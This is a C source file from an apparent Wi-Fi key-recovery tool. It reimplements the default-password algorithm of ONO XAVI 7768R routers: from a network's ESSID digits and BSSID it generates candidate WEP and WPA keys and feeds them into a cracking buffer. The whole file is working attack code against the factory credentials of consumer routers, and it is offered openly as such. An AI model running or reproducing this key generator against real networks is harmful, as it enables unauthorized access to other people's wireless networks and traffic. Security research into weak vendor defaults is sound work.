/*********************************************************************************
 * Copyright (c) 2009, Chema Garcia                                              *
 * All rights reserved.                                                          *
 *                                                                               *
 * Redistribution and use in source and binary forms, with or                    *
 * without modification, are permitted provided that the following               *
 * conditions are met:                                                           *
 *                                                                               *
 *    * Redistributions of source code must retain the above                     *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer.                                                              *
 *                                                                               *
 *    * Redistributions in binary form must reproduce the above                  *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer in the documentation and/or other materials provided          *
 *      with the distribution.                                                   *
 *                                                                               *
 *    * Neither the name of the SafetyBits nor the names of its contributors may *
 *      be used to endorse or promote products derived from this software        *
 *      without specific prior written permission.                               *
 *                                                                               *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"   *
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE     *
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE    *
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE     *
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR           *
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF          *
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS      *
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN       *
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)       *
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE    *
 * POSSIBILITY OF SUCH DAMAGE.                                                   *
 *********************************************************************************/

#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <regex.h>

#include "includes/main.h"
#include "includes/ciphers.h"
#include "includes/algorithms.h"

#include "algorithms/xavi.h"

//@todo Brute-force 4 digits from ESSID

/*unsigned short xavi_verify ( const char *bssid, const char *essid , unsigned short *type )
{
    regex_t expr;

    *type = 0;

        regcomp ( &expr, "^ONO[0-9]{4}$", REG_EXTENDED | REG_ICASE | REG_NOSUB );

        if ( !strncmp ( "00:01:38", bssid, 8 ) )
            *type = XAVI_MODEL_ONO_7768R;
        else if ( !strncmp ( "E0:91:53", bssid, 8 ) )
            *type = XAVI_MODEL_ONO_7968_SOLOS_461X;
    }

ret:
    regfree ( &expr );
    return *type;
}*/

void ono_algorithm ( struct crackdata *crack , unsigned int wpa )
{
    register int ebp5c,ebp54,ebp8c,ebp88,ebp84,ebp80,ebp1c,ebp18,ebp14;
    register int ebp10,ebp08,ebp04,ebpd0,ebpd4,ebpcc,ebpc8,ebpc4,ebpc0,ebpbc,ebpb8,ebpb4;
    register int a,b,c,d,e,aux,edx,wpa1,wpa2;
    char   pwd[PASSWD_LEN] = {0};
    unsigned char *tmp;


    if (wpa)
    {
        ebp8c = crack->net->essid[3]-48;            //ONOXxxx
        ebp88 = crack->net->essid[4]-48;            //ONOxXxx
        ebp84 = crack->net->essid[5]-48;            //ONOxxXx
        ebp80 = crack->net->essid[6]-48;            //ONOxxxX
    }
    else
    {
        ebp8c = 9-(crack->net->essid[3]-48);        //ONOXxxx
        ebp88 = 9-(crack->net->essid[4]-48);        //ONOxXxx
        ebp84 = 9-(crack->net->essid[5]-48);        //ONOxxXx
        ebp80 = 9-(crack->net->essid[6]-48);        //ONOxxxX
    }

    ebp5c = (crack->net->bssid[9])-48;                  //xx:xx:xx:Xx:xx:xx

    if (ebp5c>=17)  ebp5c = ebp5c -16;      //Pasa A->1, B->2, C->3,..F->6

    ebp54 = (crack->net->bssid[10])-48;                 //xx:xx:xx:xX:xx:xx

    if (ebp54>=17)  ebp54 = 4;              //Si bssid[10] entre A..F
    else ebp54 = 3;                 //Si bssid[10] entre 0..9

    if (ebp80==0)   ebp1c = 1;
    else ebp1c = 2;

    if (ebp80==0)   ebp18 = ebp80+9;        //rotacion 0,9,8...1,0,9..0
    else ebp18 = ebp80-1;

    ebp14 = ((ebp84*10+ebp88)+6)/10;
    if (ebp14==10)  ebp14=0;

    if (ebp88>3)    ebp10 = ebp88-4;
    else    ebp10 = ebp88+6;

    if (ebp54==3)   ebp08 = 0;
    if (ebp54==4 && ebp5c==0)       ebp08 = 0;
    if (ebp54==4 && ebp5c!=0)       ebp08 = 1;


    if (ebp5c==0)   ebp04 = 9;
    if (ebp5c!=0)   ebp04 = ebp5c-1;

//-------------------------------------------------------------------
    for ( a = 0; a <= 9 && !crack->net->pwd.checked ; ++a )
    {
        for ( b = 0; b <= 1 && !crack->net->pwd.checked ; ++b )
        {
            for ( c = 0; c <= 9 && !crack->net->pwd.checked ; ++c )
            {
                for ( d = 0; d <= 1 && !crack->net->pwd.checked ; ++d )
                {
                    for ( e = 0; e <= 9 && !crack->net->pwd.checked ; ++e )
                    {

                        if (a+8>9)      ebpd4 = a-2;
                        else    ebpd4 = a+8;

                        ebpd0 = (b*100+a*10+ebp8c+180)/100;

                        if (c+ebp04>9)  ebpcc = c+ebp04-10;             //REPITE mas abajo para ebpbc
                        else    ebpcc = c+ebp04;

                        ebpbc = ebpcc;                                  //Es igual, calcula lo mismo

                        //if (c+ebp04>9)        ebpbc = c+ebp04-10;     // REPITE lo mismo que para ebpcc
                        //      else    ebpbc = c+ebp04;

                        ebpc8 = (d*10 + c + ebp08*10 + ebp04)/10;

                        if (e*2>9)      ebpc4 = (e-5)*2;
                        else    ebpc4 = e*2;

                        if (d+1>9)      ebpc0 = d-9;                    //Nunca se cumple que d+1 sea mayor que 9
                        else    ebpc0 = d+1;                    //siempre se usa esto ebpc0 = d+1;


                        aux = b*10+c+ebp04;

                        if (aux==-10)   ebpb8 = 0;
                        else    ebpb8 = (aux+10)/10;

                        if (a+9>9)      ebpb4 = a-1;
                        else    ebpb4 = a+9;

                        edx = (ebp8c*10+a+9)/10;        //edx
                        if (edx==10)    edx=0;


                        if (wpa)
                        {
                            //------------------------------------------- wpa ------------------------------------------
                            wpa1 = ebp80*100+ebp84*10+ebp88+103;

                            if (wpa1>1000)  wpa1 = wpa1-897;

                            wpa2 = (ebp8c*100+a*10+b+81)/10;

                            snprintf ( pwd , sizeof(pwd ) , "%i%i%X%X%X%X%X%X%X%X%X",wpa1,wpa2,ebpb8,ebpbc,ebpc0,ebpc4,ebpc8,ebpcc,ebpd0,ebpd4,ebp8c);
                            tmp = (unsigned char*) strdup ( (char*) pwd );
                            cbuffer_write(crack->buffer,(void*)tmp);

                            if (ebpc0==2)
                            {
                                snprintf(pwd,sizeof(pwd),"%i%i%X%X%X%X%X%X%X%X%X",wpa1,wpa2,ebpb8,ebpbc,ebpc0-1,ebpc4,ebpc8,ebpcc,ebpd0,ebpd4,ebp8c);
                                tmp = (unsigned char*) strdup ( (char*) pwd );
                                cbuffer_write(crack->buffer,(void*)tmp);
                            }

                            if (ebpc0==1)
                            {
                                snprintf(pwd,sizeof(pwd),"%i%i%X%X%X%X%X%X%X%X%X\n",wpa1,wpa2,ebpb8,ebpbc,ebpc0+1,ebpc4,ebpc8,ebpcc,ebpd0,ebpd4,ebp8c);
                                tmp = (unsigned char*) strdup ( (char*) pwd );
                                cbuffer_write(crack->buffer,(void*)tmp);
                            }
                        }       //------------------------------------------- wpa ------------------------------------------
                        else
                        {
                            //------------------------------------------- wep ------------------------------------------
                            snprintf(pwd,sizeof(pwd),"%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X\n",ebp80,ebp84,ebp88,ebp8c,a,b,c,d,e,ebp08,ebp04,ebp1c,ebp18,ebp14,ebp10,edx,ebpb4,ebpb8,ebpbc,ebpc0,ebpc4,ebpc8,ebpcc,ebpd0,ebpd4,ebp8c);
                            tmp = (unsigned char*) strdup ( (char*) pwd );
                            cbuffer_write(crack->buffer,(void*)tmp);

                            if (ebpc0==2)
                            {
                                snprintf(pwd,sizeof(pwd),"%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X\n",ebp80,ebp84,ebp88,ebp8c,a,b,c,d,e,ebp08,ebp04,ebp1c,ebp18,ebp14,ebp10,edx,ebpb4,ebpb8,ebpbc,ebpc0-1,ebpc4,ebpc8,ebpcc,ebpd0,ebpd4,ebp8c);
                                tmp = (unsigned char*) strdup ( (char*) pwd );
                                cbuffer_write(crack->buffer,(void*)tmp);
                            }

                            if (ebpc0==1)
                            {
                                snprintf(pwd,sizeof(pwd),"%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X\n",ebp80,ebp84,ebp88,ebp8c,a,b,c,d,e,ebp08,ebp04,ebp1c,ebp18,ebp14,ebp10,edx,ebpb4,ebpb8,ebpbc,ebpc0+1,ebpc4,ebpc8,ebpcc,ebpd0,ebpd4,ebp8c);
                                tmp = (unsigned char*) strdup ( (char*) pwd );
                                cbuffer_write(crack->buffer,(void*)tmp);
                            }
                        }       //------------------------------------------- wep ------------------------------------------

                    }//for
                }
            }
        }
    }//for

    return;
}


void xavi_pwd ( struct crackdata *crack , unsigned int pattern )
{
    if ( pattern != XAVI_MODEL_ONO_7768R )
        return;

    ono_algorithm(crack,crack->net->encrypt==ENCRYPT_WEP?0:1);

    return;
}

